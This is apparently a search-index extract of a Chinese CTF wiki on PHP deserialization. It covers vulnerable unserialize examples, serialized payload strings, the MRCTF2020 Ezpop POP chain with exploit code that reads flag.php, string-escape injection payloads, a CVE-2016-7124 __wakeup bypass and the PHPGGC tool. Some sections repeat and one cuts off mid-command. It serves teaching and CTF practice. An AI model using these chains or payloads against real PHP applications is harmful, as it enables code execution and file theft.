<p>\u5f97\u5230\u7684\u7ed3\u679c\u662f\u8fd9\u6837\u7684\uff1a\uff08\u53ef\u4ee5\u81ea\u5df1\u53bb\u8bd5\u8bd5\uff09</p> <p></p> <p>\u53cd\u5e8f\u5217\u5316\u5728\u7279\u5b9a\u6761\u4ef6\u4e0b\u53ef\u4ee5\u91cd\u5efaphp\u5bf9\u8c61\u5e76\u6267\u884cphp\u5bf9\u8c61\u4e2d\u67d0\u4e9bmagic\u51fd\u6570\u3002</p> <p>\u8fd9\u4fbf\u5c31\u662f\u6f0f\u6d1e\u6765\u6e90\uff0c\u6765\u81ea\u8fd9\u4e9b\u81ea\u52a8\u8c03\u7528\u7684__magic\u51fd\u6570,\u5982\u679c\u5176\u4e2d\u6709\u67d0\u4e9b\u53c2\u6570\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u5b83\u8df3\u5230\u67d0\u4e2a\u4ee3\u7801\u6a21\u5757\u4e4b\u4e2d\u3002</p> <p></p> <p>\u5269\u4e0b\u7684\u9047\u89c1\u4e86\u4e5f\u53ef\u4ee5\u5728\u6b64\u8865\u5145\uff1a</p> <p>__tostring:\u5f53\u7c7b\u88ab\u5f53\u6210\u5b57\u7b26\u4e32\u65f6\u8c03\u7528\u3002</p> <p>\u8fd9\u4e9b\u662f\u5e38\u89c1\u7684\u3002</p>"},{"location":"web/serialize/PHP/php_serialize/#_2","title":"\u521d\u7ea7\u7684\u6f0f\u6d1e\u6848\u4f8b","text":"<pre><code>&lt;?php\nclass A{\nvar $test = \"demo\";\nfunction __destruct(){\necho $this-&gt;test;\n}\n}\n$a = $_GET['test'];\n$a_unser = unserialize($a);\n?&gt;\nPlain Text\n</code></pre> <p>\u5f88\u7ecf\u5178\uff0cGET\u5f97\u5230test\u53c2\u6570\uff0c\u7136\u540e\u53cd\u5e8f\u5217\u5316\uff0c\u91cc\u9762\u6709\u4e2a__destruct---\u5bf9\u8c61\u88ab\u9500\u6bc1\u65f6\u89e6\u53d1\u3002</p> <p>\u5982\u679c\u6211\u4eec\u8f93\u5165<code>?test=O:1:\"A\":1:{s:4:\"test\";s:4:\"test\";}</code></p> <p>\u4e5f\u5c31\u662f\u4e0b\u9762\u8fd9\u4e00\u5c0f\u6bb5\u7684\u7ed3\u679c\u3002</p> <pre><code>&lt;?php\nclass A{\nvar $test = \"demo\";\nfunction __destruct(){\necho $this-&gt;test;\n}\n}\n$a= new A();\n$a-&gt;test=\"test\";\necho serialize($a);\n?&gt;\nPlain Text\n</code></pre> <p>\u5f53\u8fd9\u6bb5\u4ee3\u7801\u6267\u884c\u5b8c\u6210\u540e\u4f1a\u8c03\u7528__destruct,\u5e76\u4e14echo  \"test\"\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u4f1a\u53d1\u73b0\u76f8\u5f53\u4e8e$test\u53d8\u6210\u4e86\u6211\u4eec\u7684\u53ef\u63a7\u53c2\u6570\uff0c\u8fd9\u91cc\u7684__destrcut\u4e0b\u7684\u51fd\u6570\u662fecho,\u90a3\u5982\u679c\u662feval(){\u5c06\u5b57\u7b26\u4e32\u4f5c\u4e3aPHP\u4ee3\u7801\u6267\u884c}\u5462\uff1f\u540e\u679c\u5c31\u662f\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8fd0\u884c\u6211\u4eec\u7684\u4ee3\u7801\u3002\u5c06test\u6539\u4e3acat /flag.</p> <p>unserialize\u6f0f\u6d1e\u4f9d\u8d56\u51e0\u4e2a\u6761\u4ef6\uff1a</p> <p>unserialize\u51fd\u6570\u7684\u53c2\u6570\u53ef\u63a7</p> <p>\u811a\u672c\u4e2d\u5b58\u5728\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff08__construct()\uff09\u3001\u6790\u6784\u51fd\u6570\uff08__destruct()\uff09\u3001__wakeup()\u51fd\u6570\u4e2d\u6709\u5411php\u6587\u4ef6\u4e2d\u5199\u6570\u636e\u7684\u64cd\u4f5c\u7684\u7c7b</p> <p>\u6240\u5199\u7684\u5185\u5bb9\u9700\u8981\u6709\u5bf9\u8c61\u4e2d\u7684\u6210\u5458\u53d8\u91cf\u7684\u503c</p>"},{"location":"web/serialize/PHP/php_serialize/#_3","title":"\u5e8f\u5217\u5316\u4e2d\u7c7b\u7684\u7c7b\u578b","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u6bd4\u8f83\u5c11\u89c1\u7684\u3002</p> <p>\u5173\u4e8e\u5e8f\u5217\u5316\u4e2d\u7c7b\u7684\u7c7b\u578b\uff1aPUBLIC,PRIVATE,PROTECTED</p> <p>\u5176\u4e2d\u5728\u63d0\u4ea4\u6570\u636e\u7684\u65f6\u5019\uff1a</p> <p>public\u4e0d\u9700\u8981\u8fdb\u884c\u8fc7\u591a\u4fee\u9970</p> <p>private\u9700\u8981%00Name%00</p> <p>protected\u5219\u662f\u9700\u8981\uff1a %00*%00username\u7684\u5f62\u5f0f</p> <p>\u4e5f\u5c31\u662f\u8bf4</p> <pre><code>O:4:\"Name\":2\uff1a{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}\nPlain Text\n</code></pre> <p>\u5982\u679c\u662fprivate\u7c7b\u578b\u7684\u8bdd\u5e94\u8be5\u5199\u6210</p> <pre><code>O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\nPlain Text\n</code></pre> <p>\u4e00\u822c\u6765\u8bf4\u6211\u4f1a\u5148\u5b9a\u4e49\u6210public\u7136\u540e\u624b\u52a8\u6dfb\u52a0\u3002</p> <p>\u4f8b\u9898\uff1a</p> <p>[\u6781\u5ba2\u5927\u6311\u6218 2019]PHP</p>"},{"location":"web/serialize/PHP/php_serialize/#pop","title":"POP\u94fe","text":"<p>\u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\u6765\u8bf4\uff0c\u8fd9\u4e0d\u662f\u4e00\u79cd\u6280\u672f\uff0c\u800c\u662f\u4e00\u79cd\u601d\u7ef4\u3002</p> <p>\u6240\u4ee5\u8bf4\u4e0d\u592a\u597d\u4ece\u7406\u8bba\u4e0a\u6765\u89e3\u91ca\u3002</p> <p>\u7ed9\u4e2a\u4f8b\u9898\uff1a</p> <p>[MRCTF2020]Ezpop</p> <p>\u4e0b\u9762\u662f\u5feb\u4e50\u7684\u4ee3\u7801\u5ba1\u8ba1\u73af\u8282</p> <pre><code>Welcome to index.php\n&lt;?php\n//flag is in flag.php\n//WTF IS THIS?\n//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\n//And Crack It!\nclass Modifier {\nprotected  $var;\npublic function append($value){\ninclude($value);\n}\npublic function __invoke(){\n$this-&gt;append($this-&gt;var);\n}\n}\nclass Show{\npublic $source;\npublic $str;\npublic function __construct($file='index.php'){\n$this-&gt;source = $file;\necho 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\";\n}\npublic function __toString(){\nreturn $this-&gt;str-&gt;source;\n}\npublic function __wakeup(){\nif(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) {\necho \"hacker\";\n$this-&gt;source = \"index.php\";\n}\n}\n}\nclass Test{\npublic $p;\npublic function __construct(){\n$this-&gt;p = array();\n}\npublic function __get($key){\n$function = $this-&gt;p;\nreturn $function();\n}\n}\nif(isset($_GET['pop'])){\n@unserialize($_GET['pop']);\n}\nelse{\n$a=new Show;\nhighlight_file(__FILE__);\n}\nPlain Text\n</code></pre> <p>\u5ba1\u8ba1\u5b8c\u4ee3\u7801\u5e94\u8be5\u662finclude\u7684\u4e00\u4e2a\u6587\u4ef6\u5305\u542b\u6765\u8bfb\u53d6\u6211\u4eec\u7684flag\uff0c\u4f46\u73b0\u5728\u7684\u95ee\u9898\u662f\u6240\u9700\u8981\u4f7f\u7528\u7684\u7c7b\u4e3aModifier,\u6211\u4eec\u6240\u80fd\u63a7\u5236\u7684\u53ea\u662f\u4e00\u4e2a\u7b80\u7b80\u5355\u5355\u7684pop\uff0c\u90a3\u4e48\u8be5\u600e\u6837\u624d\u80fd\u8fdb\u5165\u8fd9\u4e2a\u7c7b\u4e4b\u4e2d\uff1f</p> <p>\u4e0b\u9762\u662f\u4e2a\u4eba\u7684\u7406\u89e3\u3002</p> <p>\u9996\u5148\u8c03\u7528unserialize()\u51fd\u6570\u7684\u65f6\u5019\u89e6\u53d1\u7c7b\u4e2d\u7684__wakeup()\uff0cWakeup()\u8c03\u7528\u4e86\u5b57\u7b26\u5339\u914d\u8fc7\u6ee4\uff0c\u5c06\u7c7b\u8f6c\u5316\u4e3a\u5b57\u7b26\u4e32\u8c03\u7528\uff0c\u5219\u53c8\u4f1a\u81ea\u52a8\u8c03\u7528__tostring(),\u5982\u679c\u5c06\u5176\u5b9e\u4f8b\u5316\u4e3aTEST\uff0c\u5219\u4f1a\u8fd4\u56deTEST\u4e2d\u7684source\u5c5e\u6027\uff0c\u4f46\u662fTEST\u4e2d\u4e0d\u542b\u6709source \uff0c\u90a3\u4e48\u5c31\u4f1a\u89e6\u53d1\u5728\u5f53\u524d\u7c7b\u4e0d\u5305\u542b\u5c5e\u6027\u4e2d\u81ea\u52a8\u8c03\u7528\u7684__get(),\u5c06\u5176\u5b9e\u4f8b\u5316\u4e3aModifier\u7c7b\uff0c\u89e6\u53d1__invoke()\u65b9\u6cd5\uff0c\u6700\u7ec8\u5229\u7528include\u6587\u4ef6\u5305\u542b\u8bfb\u53d6\u5230flag.php\u3002</p> <p>\u8fd9\u5c31\u662fpop\u94fe</p> <p>\u4e5f\u5c31\u662funserilize-&gt;__wakeup-&gt;__tostring-&gt;__get-&gt;__invoke-&gt;include\u6587\u4ef6\u5305\u542b</p> <p>\u81f3\u4e8e\u4ee3\u7801\u7684\u5199\u6cd5\uff1a</p> <pre><code>&lt;?php\nclass Modifier {\nprotected  $var=\"php://filter/read=convert.base64-encode/resource=flag.php\";\n}\nclass Test{\npublic $p;\n}\nclass Show{\npublic $source;\npublic $str;\npublic function __construct(){\n$this-&gt;str = new Test();\n}\n}\n$a = new Show();//\u6b64\u65f6source(show)-&gt;str\n$a-&gt;source = new Show();//source(show)-&gt;str\u4e4b\u540e\u89e6\u53d1__tostring\u7136\u540e\u8bbf\u95eesource(test)\u89e6\u53d1__get\n$a-&gt;source-&gt;str-&gt;p = new Modifier();//__get\u8fd4\u56de\u7684p\u89e6\u53d1__invoke\necho serialize($a);\n?&gt;\nPlain Text\n</code></pre> <p>\u6700\u540e\u7ed3\u679c\u56e0\u4e3a\u662fprivate\u6240\u4ee5\u9700\u8981%00\u6765\u586b\u5145\u3002</p> <p>\u5982\u679c\u770b\u4e0d\u61c2\u7684\u8bdd\u53ef\u4ee5\u5c1d\u8bd5\u624b\u7ed8\u4e00\u4e0b\u7c7b\u6307\u5411\u7684\u7ed3\u6784\uff0c\u5e94\u8be5\u662f\u6ca1\u4ec0\u4e48\u5927\u95ee\u9898\u3002</p> <p>\u6700\u540e\uff0c\u8fd9\u5e94\u8be5\u662f\u78b0\u5230\u7684php\u53cd\u5e8f\u5217\u5316\u6700\u5e38\u89c1\u7684\u683c\u5f0f\uff0c\u627epop\u94fe\u53ef\u4ee5\u8bf4\u662f\u8fd9\u7c7b\u9898\u76ee\u91cc\u9762\u6700\u6709\u610f\u601d\u7684\u4e1c\u897f\u4e86\u3002</p> <p>\u5982\u679c\u60f3\u6311\u6218\u7684\u5316\u53ef\u4ee5\u5eb7\u5eb7\u3002</p> <p>[CISCN2019 \u603b\u51b3\u8d5b Day1 Web4]Laravel1</p> <p>\u8fd9\u79cd\u5927\u6846\u67b6\u4e0b\u7684\u6f0f\u6d1e\u4e00\u822c\u90fd\u662f\u5728\u7f51\u4e0a\u80fd\u627e\u5f97\u5230\u6e90\u7801\u6216\u8005\u76f4\u63a5\u662f\u6f0f\u6d1e\u3002\u8fd9\u79cd\u5c31\u529f\u5229\u4e00\u70b9\uff0c\u56e0\u4e3a\u522b\u4eba\u6316\u4e86\u5f88\u4e45\u624d\u627e\u5230\u7684\u6f0f\u6d1e\u51e0\u4e2a\u5c0f\u65f6\u89e3\u51b3\u662f\u4e0d\u5927\u73b0\u5b9e......\u7ecf\u5e38\u4f1a\u78b0\u5230\u7684\u8fd8\u6709THINKPHP5\u7cfb\u7684\u6f0f\u6d1e\u3002 \u4e00\u9053\u975e\u5e38\u957f\u957f\u957f\u7684\u53cd\u5e8f\u5217\u5316\u9898\u76ee\uff0c\u4f46\u662f\u4e5f\u5e76\u4e0d\u662f\u5b8c\u5168\u6ca1\u6709\u601d\u8def\uff0c</p> <p>\u6570\u636e\u5b89\u5168\u7814\u7a76\u9662-WIKI</p>"},{"location":"web/serialize/PHP/php_serialize/#_4","title":"\u5b57\u7b26\u9003\u9038","text":""},{"location":"web/serialize/PHP/php_serialize/#_5","title":"\u5b57\u7b26\u589e\u52a0\u578b","text":"<p>\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u4ee5<code>\";}</code>\u7ed3\u675f\u7684\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u628a<code>\";}</code>\u5e26\u5165\u9700\u8981\u53cd\u5e8f\u5217\u5316\u7684\u5b57\u7b26\u4e32\uff08\u9664\u4e86\u7ed3\u5c3e\u5904\uff09\uff0c\u5c31\u80fd\u8ba9\u53cd\u5e8f\u5217\u5316\u63d0\u524d\u95ed\u5408\u7ed3\u675f\uff0c\u540e\u9762\u7684\u5185\u5bb9\u5c31\u4e22\u5f03\u4e86\u3002</p> <p>\u8bf4\u8d77\u6765\u6709\u70b9\u96be</p> <pre><code>&lt;?php\nfunction filter($str){\n    return str_replace('bb', 'ccc', $str);\n}\nclass A{\n    public $name='aaaa';\n    public $pass='123456';\n}\n$AA=new A();\necho serialize($AA).\"\\n\";\n$res=filter(serialize($AA));\n$c=unserialize($res);\necho $c-&gt;pass;\n?&gt;\nPHP\n</code></pre> <p>\u4ee3\u7801\u7684\u903b\u8f91\u662f\u5e8f\u5217\u5316\uff0c\u7136\u540e\u5c06bb\u66ff\u6362\u4e3accc\u3002</p> <p>\u6b63\u5e38\u60c5\u51b5\u4e0b\u5982\u679c\u6211\u4eec\u4f20\u5165\uff1a$name=aaaabb,\u8fd9\u6837\u4e00\u5b9a\u4f1a\u662f\u62a5\u9519\u7684\uff1a</p> <p></p> <p>php\u662f\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u5b83\u89e3\u6790\u4e0d\u4e86\uff1aO:1:\"A\":2:{s:4:\"name\";s:6:\"aaaaccc\";s:4:\"pass\";s:6:\"123456\";}</p> <p>s\u540e\u9762\u7684aaaacc+c\u6700\u540e\u7684c\u662f\u6ca1\u529e\u6cd5\u89e3\u6790\u7684\u3002</p> <p>\u6839\u636ephp\u89e3\u6790\u5e8f\u5217\u5316\u5b57\u7b26\u7684\u65b9\u6cd5\uff0c\u5982\u679c\u6211\u4eec\u5411name\u4e2d\u4f20\u8f93\u6570\u636e\u4e3a\";s:4:\"pass\";s:6:\"hacker\";}\u3002</p> <p>name\u88ab\u5e8f\u5217\u5316\u540e\u7684\u957f\u5ea6\u662f\u56fa\u5b9a\u7684\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u540ename\u4ecd\u7136\u4e3a\";s:4:\"pass\";s:6:\"hacker\";}</p> <p></p> <p>O:1:\"A\":2:{s:4:\"name\";s:27:\"\";s:4:\"pass\";s:6:\"hacker\";}\";s:4:\"pass\";s:6:\"123456\";}</p> <p>\u53ef\u89c1\u5728\u5e8f\u5217\u5316\u540e\u7684\u5b57\u7b26\u4e32\u5728\u7ecf\u8fc7filter\u51fd\u6570\u8fc7\u6ee4\u524d\uff0cs\u4e3a6\uff0c\u5185\u5bb9\u4e3aaaaabb\uff1b\u7ecf\u8fc7filter\u8fc7\u6ee4\u540e\uff0cs\u4ecd\u7136\u4e3a6\uff0c\u4f46\u5185\u5bb9\u53d8\u4e3a\u4e86aaaaccc\uff0c\u957f\u5ea6\u53d8\u6210\u4e867\uff0c\u6839\u636e\u53cd\u5e8f\u5217\u5316\u8bfb\u53d6\u53d8\u91cf\u7684\u539f\u5219\u6765\u8bb2\uff0c\u6b64\u65f6\u7684name\u80fd\u8bfb\u53d6\u5230\u7684\u53ea\u662faaaacc\uff0c\u672b\u5c3e\u5904\u7684\u90a3\u4e2ac\u662f\u8bfb\u53d6\u4e0d\u5230\u7684\uff0c\u8fd9\u5c31\u5f62\u6210\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u9003\u9038\u3002\u5f53\u6211\u4eec\u6dfb\u52a0\u591a\u4e2abb\uff0c\u6bcf\u6dfb\u52a0\u4e00\u4e2abb\u6211\u4eec\u5c31\u80fd\u9003\u9038\u4e00\u4e2a\u5b57\u7b26\uff0c\u90a3\u6211\u4eec\u5c06\u9003\u9038\u7684\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u586b\u5145\u6210\u6211\u4eec\u8981\u53cd\u5e8f\u5217\u5316\u7684\u4ee3\u7801\u957f\u5ea6\u7684\u8bdd\u90a3\u5c31\u53ef\u4ee5\u63a7\u5236\u53cd\u5e8f\u5217\u5316\u7684\u7ed3\u679c\u4ee5\u53ca\u7c7b\u91cc\u9762\u7684\u53d8\u91cf\u503c\u4e86\u3002</p> <p>\u8fd9\u91cc\u6709\u4e2a27\uff0c\u6240\u4ee5\u6211\u4eec\u6dfb\u52a027\u4e2abb,\u76f8\u5f53\u4e8e\u66ff\u6362ccc\u540e\u5c31\u80fd\u591f\u9003\u9038\u6389\u8fd9\u4e2a27\uff0c\u7136\u540e\u7531\u6211\u4eec\u8f93\u5165\u7684\uff1b}\u95ed\u5408\u6389\u53cd\u5e8f\u5217\u5316\uff0c\u5ffd\u7565\u6389\u539f\u6765\u7684\u6570\u636e\u3002\u5b8c\u6210\u5b57\u7b26\u9003\u9038\u3002</p>"},{"location":"web/serialize/PHP/php_serialize/#_6","title":"\u5b57\u7b26\u51cf\u5c11\u578b","text":"<p>\u5f88\u7c7b\u4f3c\uff0c\u5982\u679c\u4e0a\u9762\u7684\u80fd\u591f\u770b\u61c2\u7684\u8bdd\uff0c\u4e0b\u9762\u7684\u81ea\u5df1\u5e94\u8be5\u4e5f\u5c31\u80fd\u5199\u51fa\u6765\u3002</p> <pre><code>&lt;?phpfunction str_rep($string){ return preg_replace( '/php|test/','', $string);}\n$test['name'] = $_GET['name'];$test['sign'] = $_GET['sign']; $test['number'] = '2020';$temp = str_rep(serialize($test));printf($temp);$fake = unserialize($temp);echo '&lt;br&gt;';print(\"name:\".$fake['name'].'&lt;br&gt;');print(\"sign:\".$fake['sign'].'&lt;br&gt;');print(\"number:\".$fake['number'].'&lt;br&gt;');?&gt;\nPHP\n</code></pre> <p>\u5e8f\u5217\u5316-&gt;\u66ff\u6362-&gt;\u53cd\u5e8f\u5217\u5316</p> <p>\u6211\u4eec\u8981\u4fee\u6539number\u7684\u503c\uff0c\u5c31\u8981\u5728sign\u4e2d\u52a0\u5165<code>\";s:6:\"number\";s:4:\"2020\";}</code></p> <p></p> <p>\u53ef\u4ee5\u81ea\u5df1\u6765\u5c1d\u8bd5\u3002\u770b\u4e0d\u61c2\u81ea\u5df1var_dump</p>"},{"location":"web/serialize/PHP/php_serialize/#cve-2016-7124","title":"CVE-2016-7124","text":"<p>\u5f53\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u4e2d\u8868\u793a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u7684\u5c5e\u6027\u4e2a\u6570\u65f6\u4f1a\u8df3\u8fc7__wakeup\u7684\u6267\u884c</p> <pre><code>O:4:\"test\":1:{s:4:\"name\";s:5:\"fairy\";}//\u8fd9\u4e00\u4e32\nPHP\n</code></pre> <p>\u5982\u679c\u6539\u6210                    |</p> <pre><code>O:4:\"test\":2:{s:4:\"name\";s:5:\"fairy\";}\nPlain Text\n</code></pre> <p>\u5c31\u4f1a\u8df3\u8fc7__wakeup()\u9b54\u672f\u65b9\u6cd5\u3002\uff08\u4f8b\u5b50\u5c31\u4e0d\u653e\u4e86\uff09</p>"},{"location":"web/serialize/PHP/php_serialize/#phpggc","title":"PHPGGC\u53cd\u5e8f\u5217\u5316\u5de5\u5177","text":"<p>\u8fd9\u4e2a\u5de5\u5177\u662f\u6700\u8fd1\u624d\u53d1\u73b0\u7684\uff0c\u5148\u7b49\u6211\u4f7f\u7528\u4e00\u6bb5\u65f6\u95f4\u56de\u987e\u4e00\u4e0b\u518d\u5206\u4eab\u7ed9\u5927\u5bb6\u3002\u53ef\u4ee5\u8fd0\u7528\u5728\u76ee\u524d\u6bd4\u8f83\u4e3b\u6d41\uff08\u800c\u53c8\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff09\u7684\u6846\u67b6\u4e2d\uff0c\u6bd4\u5982\u8bf4thinkphp(\u611f\u89c9\u90fd\u662f\u8001\u6bdb\u75c5\u4e86),laravel......</p> <p>\u7136\u540e\u7528\u547d\u540d\u7a7a\u95f4\u5199\u7684\u53cd\u5e8f\u5217\u5316\u672c\u4eba\u4e5f\u8fd8\u662f\u4e0d\u592a\u4f1a\u3002</p> <p>\u4ece0\u52301\u638c\u63e1\u53cd\u5e8f\u5217\u5316\u5de5\u5177\u4e4bPHPGGC - \u5148\u77e5\u793e\u533a</p> <p>\u5148\u77e5\u793e\u533a\uff0c\u5148\u77e5\u5b89\u5168\u6280\u672f\u793e\u533a</p> <p>https://xz.aliyun.com/t/5450</p>"},{"location":"web/serialize/PHP/php_serialize/#phpggc_1","title":"PHPGGC\u53cd\u5e8f\u5217\u5316\u5de5\u5177","text":"<p>\u8fd9\u4e2a\u5de5\u5177\u662f\u6700\u8fd1\u624d\u53d1\u73b0\u7684\uff0c\u5148\u7b49\u6211\u4f7f\u7528\u4e00\u6bb5\u65f6\u95f4\u56de\u987e\u4e00\u4e0b\u518d\u5206\u4eab\u7ed9\u5927\u5bb6\u3002\u53ef\u4ee5\u8fd0\u7528\u5728\u76ee\u524d\u6bd4\u8f83\u4e3b\u6d41\uff08\u800c\u53c8\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff09\u7684\u6846\u67b6\u4e2d\uff0c\u6bd4\u5982\u8bf4thinkphp(\u611f\u89c9\u90fd\u662f\u8001\u6bdb\u75c5\u4e86),laravel......</p> <p>\u7136\u540e\u7528\u547d\u540d\u7a7a\u95f4\u5199\u7684\u53cd\u5e8f\u5217\u5316\u672c\u4eba\u4e5f\u8fd8\u662f\u4e0d\u592a\u4f1a\u3002</p> <p>\u4ece0\u52301\u638c\u63e1\u53cd\u5e8f\u5217\u5316\u5de5\u5177\u4e4bPHPGGC - \u5148\u77e5\u793e\u533a</p> <p>\u5148\u77e5\u793e\u533a\uff0c\u5148\u77e5\u5b89\u5168\u6280\u672f\u793e\u533a</p> <p>https://xz.aliyun.com/t/5450</p> <p>\u653e\u4e0a\u6765\u4e86\uff0c\u81ea\u5df1\u8bd5\u8bd5\u7684\u8bdd\u53ef\u4ee5[\u5b89\u6d35\u676f 2019]iamthinking</p> <p>\u548c\u8bb0\u5f97XCTF\u4e0a\u9762\u7684\u4e00\u4e2athinkphp5\u7684\u9898\u76ee</p> <p>https://github.com/wh1t3p1g/phpggc</p> <p>\u4f5c\u8005\u7684\u4ecb\u7ecd\u3002</p> <p>\u7136\u540e\u8fd9\u662f\u672c\u4eba\u5c1d\u8bd5\u7684\u5b9e\u73b0</p> <p>[\u5b89\u6d35\u676f 2019]iamthinking</p> <p>\u62ff\u5230\u9898\u76ee\u672c\u80fd\u7684\u626b\u63cf\u4e00\u4e0b\u540e\u53f0\u53d1\u73b0\u4e86\u8fd9\u662f\u4e00\u4e2athinkphp6.x\u7684\u6846\u67b6\uff08\u6e90\u7801\u5b9e\u5728\u662f\u592a\u957f\u4e86\uff01\uff09 \u6240\u4ee5\u5f88\u5927\u6982\u7387\u662f\u548cciscn\u90a3\u9053laravel\u4e00\u6837\uff0c\u4f1a\u6709\u6bd4\u8f83\u957f\u7684\u5206\u6790\u94fe \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u4e00\u4e0b\u5de5\u5177phpggc chmod +x phpggc ./phpg</p> <p>\u6570\u636e\u5b89\u5168\u7814\u7a76\u9662-WIKI</p> <p>\u653e\u4e0a\u6765\u4e86\uff0c\u81ea\u5df1\u8bd5\u8bd5\u7684\u8bdd\u53ef\u4ee5[\u5b89\u6d35\u676f 2019]iamthinking</p> <p>\u548c\u8bb0\u5f97XCTF\u4e0a\u9762\u7684\u4e00\u4e2athinkphp5\u7684\u9898\u76ee</p> <p>https://github.com/wh1t3p1g/phpggc</p> <p>\u4f5c\u8005\u7684\u4ecb\u7ecd\u3002</p> <p>\u7136\u540e\u8fd9\u662f\u672c\u4eba\u5c1d\u8bd5\u7684\u5b9e\u73b0</p> <p>[\u5b89\u6d35\u676f 2019]iamthinking</p> <p>\u62ff\u5230\u9898\u76ee\u672c\u80fd\u7684\u626b\u63cf\u4e00\u4e0b\u540e\u53f0\u53d1\u73b0\u4e86\u8fd9\u662f\u4e00\u4e2athinkphp6.x\u7684\u6846\u67b6\uff08\u6e90\u7801\u5b9e\u5728\u662f\u592a\u957f\u4e86\uff01\uff09 \u6240\u4ee5\u5f88\u5927\u6982\u7387\u662f\u548cciscn\u90a3\u9053laravel\u4e00\u6837\uff0c\u4f1a\u6709\u6bd4\u8f83\u957f\u7684\u5206\u6790\u94fe \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u4e00\u4e0b\u5de5\u5177phpggc chmod +x phpggc ./phpg</p> <p>\u6570\u636e\u5b89\u5168\u7814\u7a76\u9662-WIKI</p>"},{"location":"web/serialize/PHP/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B7%B3%E6%9D%BF/","title":"session\u53cd\u5e8f\u5217\u5316\u8df3\u677f","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u548c\u6587\u4ef6\u5305\u542b</p> <p>\u5728php.ini\u6709\u4ee5\u4e0b\u51e0\u4e2a\u9ed8\u8ba4\u9009\u9879</p> <pre><code>1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = \"upload_progress_\"4. session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\"5. session.upload_progress.freq = \"1%\"6. session.upload_progress.min_freq = \"1\"\nPlain Text\n</code></pre> <pre><code>enabled=on\u8868\u793aupload_progress\u529f\u80fd\u5f00\u59cb\uff0c\u4e5f\u610f\u5473\u7740\u5f53\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0cphp\u5c06\u4f1a\u628a\u6b64\u6b21\u6587\u4ef6\u4e0a\u4f20\u7684\u8be6\u7ec6\u4fe1\u606f(\u5982\u4e0a\u4f20\u65f6\u95f4\u3001\u4e0a\u4f20\u8fdb\u5ea6\u7b49)\u5b58\u50a8\u5728session\u5f53\u4e2d \uff1bcleanup=on\u8868\u793a\u5f53\u6587\u4ef6\u4e0a\u4f20\u7ed3\u675f\u540e\uff0cphp\u5c06\u4f1a\u7acb\u5373\u6e05\u7a7a\u5bf9\u5e94session\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\uff0c\u8fd9\u4e2a\u9009\u9879\u975e\u5e38\u91cd\u8981\uff1bname\u5f53\u5b83\u51fa\u73b0\u5728\u8868\u5355\u4e2d\uff0cphp\u5c06\u4f1a\u62a5\u544a\u4e0a\u4f20\u8fdb\u5ea6\uff0c\u6700\u5927\u7684\u597d\u5904\u662f\uff0c\u5b83\u7684\u503c\u53ef\u63a7\uff1bprefix+name\u5c06\u8868\u793a\u4e3asession\u4e2d\u7684\u952e\u540d.session.use_strict_mode=off\u8fd9\u4e2a\u9009\u9879\u9ed8\u8ba4\u503c\u4e3aoff\uff0c\u8868\u793a\u6211\u4eec\u5bf9Cookie\u4e2dsessionid\u53ef\u63a7\u3002\nPlain Text\n</code></pre> <pre><code>session.save_path=\"D:\\xampp\\tmp\"    \u8868\u660e\u6240\u6709\u7684session\u6587\u4ef6\u90fd\u662f\u5b58\u50a8\u5728xampp/tmp\u4e0bsession.save_handler=files         \u8868\u660esession\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u5b58\u50a8\u7684session.auto_start=0              \u8868\u660e\u9ed8\u8ba4\u4e0d\u542f\u52a8sessionsession.serialize_handler=php     \u8868\u660esession\u7684\u9ed8\u8ba4\u5e8f\u5217\u8bdd\u5f15\u64ce\u4f7f\u7528\u7684\u662fphp\u5e8f\u5217\u8bdd\u5f15\u64ce\nPlain Text\n</code></pre> <p>\u5728\u4e0a\u8ff0\u7684\u914d\u7f6e\u4e2d\uff0c<code>session.serialize_handler</code>\u662f\u7528\u6765\u8bbe\u7f6esession\u7684\u5e8f\u5217\u8bdd\u5f15\u64ce\u7684\uff0c\u9664\u4e86\u9ed8\u8ba4\u7684PHP\u5f15\u64ce\u4e4b\u5916\uff0c\u8fd8\u5b58\u5728\u5176\u4ed6\u5f15\u64ce\uff0c\u4e0d\u540c\u7684\u5f15\u64ce\u6240\u5bf9\u5e94\u7684session\u7684\u5b58\u50a8\u65b9\u5f0f\u4e0d\u76f8\u540c\u3002</p> 